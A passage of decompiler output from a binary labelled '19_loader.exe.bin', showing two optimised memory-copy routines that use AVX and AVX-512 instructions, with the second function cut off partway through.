  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  undefined8 uVar19;
  undefined8 uVar20;
  undefined8 uVar21;
  undefined8 uVar22;
  undefined1 (*pauVar23) [32];
  undefined1 (*pauVar24) [32];
  undefined8 *puVar25;
  undefined8 *puVar26;
  undefined1 (*pauVar27) [32];
  undefined1 (*pauVar28) [32];
  ulonglong uVar29;
  longlong lVar30;
  ulonglong uVar31;
  undefined8 uVar32;
  undefined8 uVar33;
  
  switch(param_3) {
  case 0:
    return;
  case 1:
    *(undefined1 *)param_1 = *(undefined1 *)param_2;
    return;
  case 2:
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    return;
  case 3:
    uVar7 = *(undefined1 *)((longlong)param_2 + 2);
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    *(undefined1 *)((longlong)param_1 + 2) = uVar7;
    return;
  case 4:
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    return;
  case 5:
    uVar7 = *(undefined1 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined1 *)((longlong)param_1 + 4) = uVar7;
    return;
  case 6:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    return;
  case 7:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    uVar7 = *(undefined1 *)((longlong)param_2 + 6);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    *(undefined1 *)((longlong)param_1 + 6) = uVar7;
    return;
  case 8:
    *param_1 = *param_2;
    return;
  case 9:
    uVar7 = *(undefined1 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined1 *)(param_1 + 1) = uVar7;
    return;
  case 10:
    uVar8 = *(undefined2 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    return;
  case 0xb:
    uVar8 = *(undefined2 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 10);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    *(undefined1 *)((longlong)param_1 + 10) = uVar7;
    return;
  case 0xc:
    uVar9 = *(undefined4 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    return;
  case 0xd:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined1 *)((longlong)param_1 + 0xc) = uVar7;
    return;
  case 0xe:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    return;
  case 0xf:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xe);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    *(undefined1 *)((longlong)param_1 + 0xe) = uVar7;
    return;
  }
  if (param_3 < 0x21) {
    uVar10 = param_2[1];
    puVar26 = (undefined8 *)((longlong)param_2 + (param_3 - 0x10));
    uVar11 = *puVar26;
    uVar12 = puVar26[1];
    *param_1 = *param_2;
    param_1[1] = uVar10;
    puVar26 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    *puVar26 = uVar11;
    puVar26[1] = uVar12;
    return;
  }
  puVar26 = (undefined8 *)((longlong)param_2 + param_3);
  if (param_1 <= param_2) {
    puVar26 = param_1;
  }
  if (param_1 < puVar26) {
    uVar10 = *param_2;
    uVar11 = param_2[1];
    lVar30 = (longlong)param_2 - (longlong)param_1;
    puVar26 = (undefined8 *)((longlong)param_1 + lVar30 + (param_3 - 0x10));
    uVar12 = *puVar26;
    uVar13 = puVar26[1];
    puVar25 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    uVar29 = param_3 - 0x10;
    puVar26 = puVar25;
    uVar32 = uVar12;
    uVar33 = uVar13;
    if (((ulonglong)puVar25 & 0xf) != 0) {
      puVar26 = (undefined8 *)((ulonglong)puVar25 & 0xfffffffffffffff0);
      uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
      *puVar25 = uVar12;
      *(undefined8 *)((longlong)param_1 + (param_3 - 8)) = uVar13;
      uVar29 = (longlong)puVar26 - (longlong)param_1;
    }
    uVar31 = uVar29 >> 7;
    if (uVar31 != 0) {
      *puVar26 = uVar32;
      puVar26[1] = uVar33;
      puVar25 = puVar26;
      while( true ) {
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x10);
        uVar12 = puVar1[1];
        puVar26 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x20);
        uVar13 = *puVar26;
        uVar32 = puVar26[1];
        puVar26 = puVar25 + -0x10;
        puVar25[-2] = *puVar1;
        puVar25[-1] = uVar12;
        puVar25[-4] = uVar13;
        puVar25[-3] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x30);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x40);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        uVar31 = uVar31 - 1;
        puVar25[-6] = *puVar1;
        puVar25[-5] = uVar12;
        puVar25[-8] = uVar13;
        puVar25[-7] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x50);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x60);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        puVar25[-10] = *puVar1;
        puVar25[-9] = uVar12;
        puVar25[-0xc] = uVar13;
        puVar25[-0xb] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x70);
        uVar12 = *puVar1;
        uVar13 = puVar1[1];
        uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
        uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
        if (uVar31 == 0) break;
        puVar25[-0xe] = uVar12;
        puVar25[-0xd] = uVar13;
        *puVar26 = uVar32;
        puVar25[-0xf] = uVar33;
        puVar25 = puVar26;
      }
      puVar25[-0xe] = uVar12;
      puVar25[-0xd] = uVar13;
      uVar29 = uVar29 & 0x7f;
    }
    for (uVar31 = uVar29 >> 4; uVar31 != 0; uVar31 = uVar31 - 1) {
      *puVar26 = uVar32;
      puVar26[1] = uVar33;
      puVar26 = puVar26 + -2;
      uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
    }
    if ((uVar29 & 0xf) != 0) {
      *param_1 = uVar10;
      param_1[1] = uVar11;
    }
    *puVar26 = uVar32;
    puVar26[1] = uVar33;
    return;
  }
  if ((param_3 < 0x180000) && (0x1fff < param_3)) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined1 *)param_1 = *(undefined1 *)param_2;
      param_2 = (undefined8 *)((longlong)param_2 + 1);
      param_1 = (undefined8 *)((longlong)param_1 + 1);
    }
    return;
  }
  uVar10 = *param_2;
  uVar11 = param_2[1];
  uVar12 = param_2[2];
  uVar13 = param_2[3];
  puVar26 = (undefined8 *)((longlong)param_2 + (param_3 - 0x20));
  uVar32 = *puVar26;
  uVar33 = puVar26[1];
  uVar14 = puVar26[2];
  uVar15 = puVar26[3];
  if (0x100 < param_3) {
    lVar30 = ((ulonglong)param_1 & 0x1f) - 0x20;
    pauVar23 = (undefined1 (*) [32])((longlong)param_1 - lVar30);
    pauVar27 = (undefined1 (*) [32])((longlong)param_2 - lVar30);
    param_3 = param_3 + lVar30;
    if (0x100 < param_3) {
      if (0x180000 < param_3) {
        do {
          uVar29 = param_3;
          pauVar28 = pauVar27;
          pauVar24 = pauVar23;
          auVar3 = pauVar28[1];
          auVar4 = pauVar28[2];
          auVar5 = pauVar28[3];
          auVar6 = vmovntdq_avx(*pauVar28);
          *pauVar24 = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[1] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[2] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[3] = auVar3;
          auVar3 = pauVar28[5];
          auVar4 = pauVar28[6];
          auVar5 = pauVar28[7];
          auVar6 = vmovntdq_avx(pauVar28[4]);
          pauVar24[4] = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[5] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[6] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[7] = auVar3;
          pauVar23 = pauVar24 + 8;
          pauVar27 = pauVar28 + 8;
          param_3 = uVar29 - 0x100;
        } while (0xff < uVar29 - 0x100);
        uVar31 = uVar29 - 0xe1 & 0xffffffffffffffe0;
        switch(uVar29) {
        case 0x1e1:
        case 0x1e2:
        case 0x1e3:
        case 0x1e4:
        case 0x1e5:
        case 0x1e6:
        case 0x1e7:
        case 0x1e8:
        case 0x1e9:
        case 0x1ea:
        case 0x1eb:
        case 0x1ec:
        case 0x1ed:
        case 0x1ee:
        case 0x1ef:
        case 0x1f0:
        case 0x1f1:
        case 0x1f2:
        case 499:
        case 500:
        case 0x1f5:
        case 0x1f6:
        case 0x1f7:
        case 0x1f8:
        case 0x1f9:
        case 0x1fa:
        case 0x1fb:
        case 0x1fc:
        case 0x1fd:
        case 0x1fe:
        case 0x1ff:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(*pauVar28 + uVar31));
          *(undefined1 (*) [32])(*pauVar24 + uVar31) = auVar3;
        case 0x1c1:
        case 0x1c2:
        case 0x1c3:
        case 0x1c4:
        case 0x1c5:
        case 0x1c6:
        case 0x1c7:
        case 0x1c8:
        case 0x1c9:
        case 0x1ca:
        case 0x1cb:
        case 0x1cc:
        case 0x1cd:
        case 0x1ce:
        case 0x1cf:
        case 0x1d0:
        case 0x1d1:
        case 0x1d2:
        case 0x1d3:
        case 0x1d4:
        case 0x1d5:
        case 0x1d6:
        case 0x1d7:
        case 0x1d8:
        case 0x1d9:
        case 0x1da:
        case 0x1db:
        case 0x1dc:
        case 0x1dd:
        case 0x1de:
        case 0x1df:
        case 0x1e0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[1] + uVar31));
          *(undefined1 (*) [32])(pauVar24[1] + uVar31) = auVar3;
        case 0x1a1:
        case 0x1a2:
        case 0x1a3:
        case 0x1a4:
        case 0x1a5:
        case 0x1a6:
        case 0x1a7:
        case 0x1a8:
        case 0x1a9:
        case 0x1aa:
        case 0x1ab:
        case 0x1ac:
        case 0x1ad:
        case 0x1ae:
        case 0x1af:
        case 0x1b0:
        case 0x1b1:
        case 0x1b2:
        case 0x1b3:
        case 0x1b4:
        case 0x1b5:
        case 0x1b6:
        case 0x1b7:
        case 0x1b8:
        case 0x1b9:
        case 0x1ba:
        case 0x1bb:
        case 0x1bc:
        case 0x1bd:
        case 0x1be:
        case 0x1bf:
        case 0x1c0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[2] + uVar31));
          *(undefined1 (*) [32])(pauVar24[2] + uVar31) = auVar3;
        case 0x181:
        case 0x182:
        case 0x183:
        case 0x184:
        case 0x185:
        case 0x186:
        case 0x187:
        case 0x188:
        case 0x189:
        case 0x18a:
        case 0x18b:
        case 0x18c:
        case 0x18d:
        case 0x18e:
        case 399:
        case 400:
        case 0x191:
        case 0x192:
        case 0x193:
        case 0x194:
        case 0x195:
        case 0x196:
        case 0x197:
        case 0x198:
        case 0x199:
        case 0x19a:
        case 0x19b:
        case 0x19c:
        case 0x19d:
        case 0x19e:
        case 0x19f:
        case 0x1a0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[3] + uVar31));
          *(undefined1 (*) [32])(pauVar24[3] + uVar31) = auVar3;
        case 0x161:
        case 0x162:
        case 0x163:
        case 0x164:
        case 0x165:
        case 0x166:
        case 0x167:
        case 0x168:
        case 0x169:
        case 0x16a:
        case 0x16b:
        case 0x16c:
        case 0x16d:
        case 0x16e:
        case 0x16f:
        case 0x170:
        case 0x171:
        case 0x172:
        case 0x173:
        case 0x174:
        case 0x175:
        case 0x176:
        case 0x177:
        case 0x178:
        case 0x179:
        case 0x17a:
        case 0x17b:
        case 0x17c:
        case 0x17d:
        case 0x17e:
        case 0x17f:
        case 0x180:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[4] + uVar31));
          *(undefined1 (*) [32])(pauVar24[4] + uVar31) = auVar3;
        case 0x141:
        case 0x142:
        case 0x143:
        case 0x144:
        case 0x145:
        case 0x146:
        case 0x147:
        case 0x148:
        case 0x149:
        case 0x14a:
        case 0x14b:
        case 0x14c:
        case 0x14d:
        case 0x14e:
        case 0x14f:
        case 0x150:
        case 0x151:
        case 0x152:
        case 0x153:
        case 0x154:
        case 0x155:
        case 0x156:
        case 0x157:
        case 0x158:
        case 0x159:
        case 0x15a:
        case 0x15b:
        case 0x15c:
        case 0x15d:
        case 0x15e:
        case 0x15f:
        case 0x160:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[5] + uVar31));
          *(undefined1 (*) [32])(pauVar24[5] + uVar31) = auVar3;
        case 0x121:
        case 0x122:
        case 0x123:
        case 0x124:
        case 0x125:
        case 0x126:
        case 0x127:
        case 0x128:
        case 0x129:
        case 0x12a:
        case 299:
        case 300:
        case 0x12d:
        case 0x12e:
        case 0x12f:
        case 0x130:
        case 0x131:
        case 0x132:
        case 0x133:
        case 0x134:
        case 0x135:
        case 0x136:
        case 0x137:
        case 0x138:
        case 0x139:
        case 0x13a:
        case 0x13b:
        case 0x13c:
        case 0x13d:
        case 0x13e:
        case 0x13f:
        case 0x140:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[6] + uVar31));
          *(undefined1 (*) [32])(pauVar24[6] + uVar31) = auVar3;
        default:
          puVar26 = (undefined8 *)(pauVar24[-1] + uVar29);
          *puVar26 = uVar32;
          puVar26[1] = uVar33;
          puVar26[2] = uVar14;
          puVar26[3] = uVar15;
        case 0x100:
          *param_1 = uVar10;
          param_1[1] = uVar11;
          param_1[2] = uVar12;
          param_1[3] = uVar13;
          return;
        }
      }
      do {
        uVar10 = *(undefined8 *)(*pauVar27 + 8);
        uVar11 = *(undefined8 *)(*pauVar27 + 0x10);
        uVar12 = *(undefined8 *)(*pauVar27 + 0x18);
        uVar13 = *(undefined8 *)pauVar27[1];
        uVar32 = *(undefined8 *)(pauVar27[1] + 8);
        uVar33 = *(undefined8 *)(pauVar27[1] + 0x10);
        uVar14 = *(undefined8 *)(pauVar27[1] + 0x18);
        uVar15 = *(undefined8 *)pauVar27[2];
        uVar16 = *(undefined8 *)(pauVar27[2] + 8);
        uVar17 = *(undefined8 *)(pauVar27[2] + 0x10);
        uVar18 = *(undefined8 *)(pauVar27[2] + 0x18);
        uVar19 = *(undefined8 *)pauVar27[3];
        uVar20 = *(undefined8 *)(pauVar27[3] + 8);
        uVar21 = *(undefined8 *)(pauVar27[3] + 0x10);
        uVar22 = *(undefined8 *)(pauVar27[3] + 0x18);
        *(undefined8 *)*pauVar23 = *(undefined8 *)*pauVar27;
        *(undefined8 *)(*pauVar23 + 8) = uVar10;
        *(undefined8 *)(*pauVar23 + 0x10) = uVar11;
        *(undefined8 *)(*pauVar23 + 0x18) = uVar12;
        *(undefined8 *)pauVar23[1] = uVar13;
        *(undefined8 *)(pauVar23[1] + 8) = uVar32;
        *(undefined8 *)(pauVar23[1] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[1] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[2] = uVar15;
        *(undefined8 *)(pauVar23[2] + 8) = uVar16;
        *(undefined8 *)(pauVar23[2] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[2] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[3] = uVar19;
        *(undefined8 *)(pauVar23[3] + 8) = uVar20;
        *(undefined8 *)(pauVar23[3] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[3] + 0x18) = uVar22;
        uVar10 = *(undefined8 *)(pauVar27[4] + 8);
        uVar11 = *(undefined8 *)(pauVar27[4] + 0x10);
        uVar12 = *(undefined8 *)(pauVar27[4] + 0x18);
        uVar13 = *(undefined8 *)pauVar27[5];
        uVar32 = *(undefined8 *)(pauVar27[5] + 8);
        uVar33 = *(undefined8 *)(pauVar27[5] + 0x10);
        uVar14 = *(undefined8 *)(pauVar27[5] + 0x18);
        uVar15 = *(undefined8 *)pauVar27[6];
        uVar16 = *(undefined8 *)(pauVar27[6] + 8);
        uVar17 = *(undefined8 *)(pauVar27[6] + 0x10);
        uVar18 = *(undefined8 *)(pauVar27[6] + 0x18);
        uVar19 = *(undefined8 *)pauVar27[7];
        uVar20 = *(undefined8 *)(pauVar27[7] + 8);
        uVar21 = *(undefined8 *)(pauVar27[7] + 0x10);
        uVar22 = *(undefined8 *)(pauVar27[7] + 0x18);
        *(undefined8 *)pauVar23[4] = *(undefined8 *)pauVar27[4];
        *(undefined8 *)(pauVar23[4] + 8) = uVar10;
        *(undefined8 *)(pauVar23[4] + 0x10) = uVar11;
        *(undefined8 *)(pauVar23[4] + 0x18) = uVar12;
        *(undefined8 *)pauVar23[5] = uVar13;
        *(undefined8 *)(pauVar23[5] + 8) = uVar32;
        *(undefined8 *)(pauVar23[5] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[5] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[6] = uVar15;
        *(undefined8 *)(pauVar23[6] + 8) = uVar16;
        *(undefined8 *)(pauVar23[6] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[6] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[7] = uVar19;
        *(undefined8 *)(pauVar23[7] + 8) = uVar20;
        *(undefined8 *)(pauVar23[7] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[7] + 0x18) = uVar22;
        pauVar23 = pauVar23 + 8;
        pauVar27 = pauVar27 + 8;
        param_3 = param_3 - 0x100;
      } while (0xff < param_3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014001bdb2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_1400953b0 + (param_3 + 0x1f >> 5) * 4)))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1bf90 | partial_markers_remain ===== */
/* address=14001bf90 rva=0x1bf90 */

void FUN_14001bf90(undefined1 (*param_1) [64],undefined1 (*param_2) [64],ulonglong param_3)

{
  undefined1 *puVar1;
  undefined1 auVar2 [32];
  bool bVar3;
  byte bVar4;
  undefined1 uVar5;
  undefined1 uVar6;
  undefined1 uVar7;
  undefined1 uVar8;
  undefined1 uVar9;
  undefined1 uVar10;
  undefined1 uVar11;
  undefined1 uVar12;
  undefined1 uVar13;
  undefined1 uVar14;
  undefined1 uVar15;
  undefined1 uVar16;
  undefined1 uVar17;
  undefined1 uVar18;
  undefined1 uVar19;
  undefined8 uVar20;
  undefined8 uVar21;
  undefined8 uVar22;
  undefined8 uVar23;
  undefined8 uVar24;
  undefined1 (*pauVar25) [64];
  undefined1 (*pauVar26) [64];
  undefined1 *puVar27;
  undefined1 *puVar28;
  undefined1 *puVar29;
  undefined1 (*pauVar30) [64];
  undefined1 (*pauVar31) [64];
  ulonglong uVar32;
  longlong lVar33;
  ulonglong uVar34;
  ulonglong uVar35;
  undefined1 auVar36 [30];
  undefined1 auVar37 [64];
  undefined1 auVar39 [64];
  undefined1 auVar38 [64];
  undefined1 auVar40 [64];
  undefined1 auVar41 [64];
  undefined1 auVar42 [64];
  char in_XMM0_Ba;
  undefined1 uVar43;
  char in_XMM0_Bb;
  undefined1 uVar44;
  char in_XMM0_Bc;
  undefined1 uVar45;
  char in_XMM0_Bd;
  undefined1 uVar46;
  char in_XMM0_Be;
  undefined1 uVar47;
  char in_XMM0_Bf;
  undefined1 uVar48;
  char in_XMM0_Bg;
  undefined1 uVar49;
  char in_XMM0_Bh;
  undefined1 uVar50;
  char in_XMM0_Bi;
  undefined1 uVar51;
  char in_XMM0_Bj;
  undefined1 uVar52;
  char in_XMM0_Bk;
  undefined1 uVar53;
  char in_XMM0_Bl;
  undefined1 uVar54;
  char in_XMM0_Bm;
  undefined1 uVar55;
  char in_XMM0_Bn;
  undefined1 uVar56;
  char in_XMM0_Bo;
  undefined1 uVar57;
  char in_XMM0_Bp;
  undefined1 uVar58;
  char in_YMM0_H;
  char in_register_00001211;
  char in_register_00001212;
  char in_register_00001213;
  char in_register_00001214;
  char in_register_00001215;
  char in_register_00001216;
  char in_register_00001217;
  char in_register_00001218;
  char in_register_00001219;
  char in_register_0000121a;
  char in_register_0000121b;
  char in_register_0000121c;
  char in_register_0000121d;
  char in_register_0000121e;
  char in_register_0000121f;
  char in_register_00001220;
  char in_register_00001221;
  char in_register_00001222;
  char in_register_00001223;
  char in_register_00001224;
  char in_register_00001225;
  char in_register_00001226;
  char in_register_00001227;
  char in_register_00001228;
  char in_register_00001229;
  char in_register_0000122a;
  char in_register_0000122b;
  char in_register_0000122c;
  char in_register_0000122d;
  char in_register_0000122e;
  char in_register_0000122f;
  char in_register_00001230;
  char in_register_00001231;
  char in_register_00001232;
  char in_register_00001233;
  char in_register_00001234;
  char in_register_00001235;
  char in_register_00001236;
  char in_register_00001237;
  char in_register_00001238;
  char in_register_00001239;
  char in_register_0000123a;
  char in_register_0000123b;
  char in_register_0000123c;
  char in_register_0000123d;
  char in_register_0000123e;
  char in_register_0000123f;
  char in_XMM1_Ba;
  char in_XMM1_Bb;
  char in_XMM1_Bc;
  char in_XMM1_Bd;
  char in_XMM1_Be;
  char in_XMM1_Bf;
  char in_XMM1_Bg;
  char in_XMM1_Bh;
  char in_XMM1_Bi;
  char in_XMM1_Bj;
  char in_XMM1_Bk;
  char in_XMM1_Bl;
  char in_XMM1_Bm;
  char in_XMM1_Bn;
  char in_XMM1_Bo;
  char in_XMM1_Bp;
  char in_YMM1_H;
  char in_register_00001251;
  char in_register_00001252;
  char in_register_00001253;
  char in_register_00001254;
  char in_register_00001255;
  char in_register_00001256;
  char in_register_00001257;
  char in_register_00001258;
  char in_register_00001259;
  char in_register_0000125a;
  char in_register_0000125b;
  char in_register_0000125c;
  char in_register_0000125d;
  char in_register_0000125e;
  char in_register_0000125f;
  char in_register_00001260;
  char in_register_00001261;
  char in_register_00001262;
  char in_register_00001263;
  char in_register_00001264;
  char in_register_00001265;
  char in_register_00001266;
  char in_register_00001267;
  char in_register_00001268;
  char in_register_00001269;
  char in_register_0000126a;
  char in_register_0000126b;
  char in_register_0000126c;
  char in_register_0000126d;
  char in_register_0000126e;
  char in_register_0000126f;
  char in_register_00001270;
  char in_register_00001271;
  char in_register_00001272;
  char in_register_00001273;
  char in_register_00001274;
  char in_register_00001275;
  char in_register_00001276;
  char in_register_00001277;
  char in_register_00001278;
  char in_register_00001279;
  char in_register_0000127a;
  char in_register_0000127b;
  char in_register_0000127c;
  char in_register_0000127d;
  char in_register_0000127e;
  char in_register_0000127f;
  char in_XMM2_Ba;
  char in_XMM2_Bb;
  char in_XMM2_Bc;
  char in_XMM2_Bd;
  char in_XMM2_Be;
  char in_XMM2_Bf;
  char in_XMM2_Bg;
  char in_XMM2_Bh;
  char in_XMM2_Bi;
  char in_XMM2_Bj;
  char in_XMM2_Bk;
  char in_XMM2_Bl;
  char in_XMM2_Bm;
  char in_XMM2_Bn;
  char in_XMM2_Bo;
  char in_XMM2_Bp;
  char in_YMM2_H;
  char in_register_00001291;
  char in_register_00001292;
  char in_register_00001293;
  char in_register_00001294;
  char in_register_00001295;
  char in_register_00001296;
  char in_register_00001297;
  char in_register_00001298;
  char in_register_00001299;
  char in_register_0000129a;
  char in_register_0000129b;
  char in_register_0000129c;
  char in_register_0000129d;
  char in_register_0000129e;
  char in_register_0000129f;
  char in_register_000012a0;
  char in_register_000012a1;
  char in_register_000012a2;
  char in_register_000012a3;
  char in_register_000012a4;
  char in_register_000012a5;
  char in_register_000012a6;
  char in_register_000012a7;
  char in_register_000012a8;
  char in_register_000012a9;
  char in_register_000012aa;
  char in_register_000012ab;
  char in_register_000012ac;
  char in_register_000012ad;
  char in_register_000012ae;
  char in_register_000012af;
  char in_register_000012b0;
  char in_register_000012b1;
  char in_register_000012b2;
  char in_register_000012b3;
  char in_register_000012b4;
  char in_register_000012b5;
  char in_register_000012b6;
  char in_register_000012b7;
  char in_register_000012b8;
  char in_register_000012b9;
  char in_register_000012ba;
  char in_register_000012bb;
  char in_register_000012bc;
  char in_register_000012bd;
  char in_register_000012be;
  char in_register_000012bf;
  
  if (param_3 < 0x41) {
    uVar32 = *(ulonglong *)(&DAT_140095448 + param_3 * 8);
    auVar37 = vmovdqu8_avx512bw(*param_2);
    bVar3 = (bool)((byte)uVar32 & 1);
    auVar38[0] = bVar3 * auVar37[0] | !bVar3 * in_XMM1_Ba;
    bVar3 = (bool)((byte)(uVar32 >> 1) & 1);
    auVar38[1] = bVar3 * auVar37[1] | !bVar3 * in_XMM1_Bb;
    bVar3 = (bool)((byte)(uVar32 >> 2) & 1);
    auVar38[2] = bVar3 * auVar37[2] | !bVar3 * in_XMM1_Bc;
    bVar3 = (bool)((byte)(uVar32 >> 3) & 1);
    auVar38[3] = bVar3 * auVar37[3] | !bVar3 * in_XMM1_Bd;
    bVar3 = (bool)((byte)(uVar32 >> 4) & 1);
    auVar38[4] = bVar3 * auVar37[4] | !bVar3 * in_XMM1_Be;
    bVar3 = (bool)((byte)(uVar32 >> 5) & 1);
    auVar38[5] = bVar3 * auVar37[5] | !bVar3 * in_XMM1_Bf;
    bVar3 = (bool)((byte)(uVar32 >> 6) & 1);
    auVar38[6] = bVar3 * auVar37[6] | !bVar3 * in_XMM1_Bg;
    bVar3 = (bool)((byte)(uVar32 >> 7) & 1);
    auVar38[7] = bVar3 * auVar37[7] | !bVar3 * in_XMM1_Bh;
    bVar3 = (bool)((byte)(uVar32 >> 8) & 1);
    auVar38[8] = bVar3 * auVar37[8] | !bVar3 * in_XMM1_Bi;
    bVar3 = (bool)((byte)(uVar32 >> 9) & 1);
    auVar38[9] = bVar3 * auVar37[9] | !bVar3 * in_XMM1_Bj;
    bVar3 = (bool)((byte)(uVar32 >> 10) & 1);
    auVar38[10] = bVar3 * auVar37[10] | !bVar3 * in_XMM1_Bk;
    bVar3 = (bool)((byte)(uVar32 >> 0xb) & 1);
    auVar38[0xb] = bVar3 * auVar37[0xb] | !bVar3 * in_XMM1_Bl;
    bVar3 = (bool)((byte)(uVar32 >> 0xc) & 1);
    auVar38[0xc] = bVar3 * auVar37[0xc] | !bVar3 * in_XMM1_Bm;
    bVar3 = (bool)((byte)(uVar32 >> 0xd) & 1);
    auVar38[0xd] = bVar3 * auVar37[0xd] | !bVar3 * in_XMM1_Bn;
    bVar3 = (bool)((byte)(uVar32 >> 0xe) & 1);
    auVar38[0xe] = bVar3 * auVar37[0xe] | !bVar3 * in_XMM1_Bo;
    bVar3 = (bool)((byte)(uVar32 >> 0xf) & 1);
    auVar38[0xf] = bVar3 * auVar37[0xf] | !bVar3 * in_XMM1_Bp;
    bVar3 = (bool)((byte)(uVar32 >> 0x10) & 1);
    auVar38[0x10] = bVar3 * auVar37[0x10] | !bVar3 * in_YMM1_H;
    bVar3 = (bool)((byte)(uVar32 >> 0x11) & 1);
    auVar38[0x11] = bVar3 * auVar37[0x11] | !bVar3 * in_register_00001251;
    bVar3 = (bool)((byte)(uVar32 >> 0x12) & 1);
    auVar38[0x12] = bVar3 * auVar37[0x12] | !bVar3 * in_register_00001252;
    bVar3 = (bool)((byte)(uVar32 >> 0x13) & 1);
    auVar38[0x13] = bVar3 * auVar37[0x13] | !bVar3 * in_register_00001253;
    bVar3 = (bool)((byte)(uVar32 >> 0x14) & 1);
    auVar38[0x14] = bVar3 * auVar37[0x14] | !bVar3 * in_register_00001254;
    bVar3 = (bool)((byte)(uVar32 >> 0x15) & 1);
    auVar38[0x15] = bVar3 * auVar37[0x15] | !bVar3 * in_register_00001255;
    bVar3 = (bool)((byte)(uVar32 >> 0x16) & 1);
    auVar38[0x16] = bVar3 * auVar37[0x16] | !bVar3 * in_register_00001256;
    bVar3 = (bool)((byte)(uVar32 >> 0x17) & 1);
    auVar38[0x17] = bVar3 * auVar37[0x17] | !bVar3 * in_register_00001257;
    bVar3 = (bool)((byte)(uVar32 >> 0x18) & 1);
    auVar38[0x18] = bVar3 * auVar37[0x18] | !bVar3 * in_register_00001258;
    bVar3 = (bool)((byte)(uVar32 >> 0x19) & 1);
    auVar38[0x19] = bVar3 * auVar37[0x19] | !bVar3 * in_register_00001259;
    bVar3 = (bool)((byte)(uVar32 >> 0x1a) & 1);
    auVar38[0x1a] = bVar3 * auVar37[0x1a] | !bVar3 * in_register_0000125a;
    bVar3 = (bool)((byte)(uVar32 >> 0x1b) & 1);
    auVar38[0x1b] = bVar3 * auVar37[0x1b] | !bVar3 * in_register_0000125b;
